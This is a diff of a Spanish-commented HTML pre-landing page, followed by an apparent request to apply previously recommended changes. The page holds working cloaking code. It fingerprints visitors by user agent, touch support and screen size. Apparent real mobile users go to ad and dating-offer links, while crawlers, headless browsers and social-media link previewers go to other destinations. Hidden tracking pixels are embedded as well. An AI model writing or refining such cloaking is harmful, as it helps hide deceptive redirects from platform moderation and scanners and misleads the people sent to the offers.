@@ -23,43 +23,44 @@
 <body>
 
   <!-- Imagen visible mientras se filtra tráfico -->
-  <img src="https://i.ibb.co/rGxdBzf5/An-example-of-a-pre-landing-page-for-Dating-offers.jpg?text=Haz+Click+Aquí" alt="Redireccionando...">
+  <img src="https://i.ibb.co/YBFqXTPJ/Protesta-con-barricada-ardiente-en-Hait.png" alt="Redireccionando...">
 
   <script>
-    // Lista de enlaces
-    const links = [
-      "https://www.profitableratecpm.com/tt8k7succ?key=16da75e3921e95e74ba03df4724376b0",
-      "https://www.profitableratecpm.com/tt8k7succ?key=16da75e3921e95e74ba03df4724376b0",
-      "https://www.profitableratecpm.com/tt8k7succ?key=16da75e3921e95e74ba03df4724376b0",
-      "https://www.profitableratecpm.com/tt8k7succ?key=16da75e3921e95e74ba03df4724376b0",
-      "https://www.profitableratecpm.com/tt8k7succ?key=16da75e3921e95e74ba03df4724376b0",
-      "https://www.profitableratecpm.com/tt8k7succ?key=16da75e3921e95e74ba03df4724376b0"
+    // Lista de enlaces limpios y secundarios
+    const cleanLinks = [
+      "https://www.carmovethermal.space/?sl=5951158-e44f2&pub_click_id={External_ID_from_traffic_source}&site={subID}&pub_sub_id={sub_subID}",
+      "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global"
     ];
 
-    // Detectar bots comunes por User-Agent
-    const isBot = /bot|crawl|slurp|spider|mediapartners|facebook|whatsapp|preview/i.test(navigator.userAgent);
+    const dirtyLinks = [
+      "https://www.profitableratecpm.com/tt8k7succ?key=16da75e3921e95e74ba03df4724376b0",
+      "https://www.facebook.com/profile.php?id=61557594643465"
+    ];
 
-    // Verificar si es pantalla táctil (evita tráfico de escritorio emulado)
+    // Filtros básicos
+    const isBot = /bot|crawl|spider|facebook|whatsapp|preview|headless|phantom/i.test(navigator.userAgent);
     const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+    const screenOK = window.innerWidth > 300 && window.innerHeight > 300;
 
-    // Esperar 3 segundos antes de redirigir (simula carga humana)
     setTimeout(() => {
-      if (!isBot && hasTouch) {
-        const randomLink = links[Math.floor(Math.random() * links.length)];
-        window.location.href = randomLink;
+      if (!isBot && hasTouch && screenOK) {
+        const cleanURL = cleanLinks[Math.floor(Math.random() * cleanLinks.length)];
+        window.location.href = cleanURL;
       } else {
-        console.log("Tráfico bloqueado por sospecha de bot.");
-        // Puedes redirigir a una página de salida o quedarte aquí
-        document.body.innerHTML = "<h1 style='color: white; text-align:center;'>Acceso restringido</h1>";
+        const dirtyURL = dirtyLinks[Math.floor(Math.random() * dirtyLinks.length)];
+        window.location.href = dirtyURL;
       }
     }, 3000);
   </script>
-
-  <!-- Pixel invisible -->
-  <div style="visibility:hidden">
+ <div style="visibility:hidden">
     <center>
       <img src="//whos.amung.us/pingjs/?k=lonelywolf&amp;t=TeamCastle&amp;x=https://www.youtube.com/" style="display:none">
     </center>
   </div>
+  <!-- Pixel invisible -->
+  <div style="visibility:hidden">
+    <img src="//whos.amung.us/pingjs/?k=lonelywolf&amp;t=FiltroDating" style="display:none">
+  </div>
+
 </body>
-</html> hasme todo lo que recomendaste en este html
+</html>
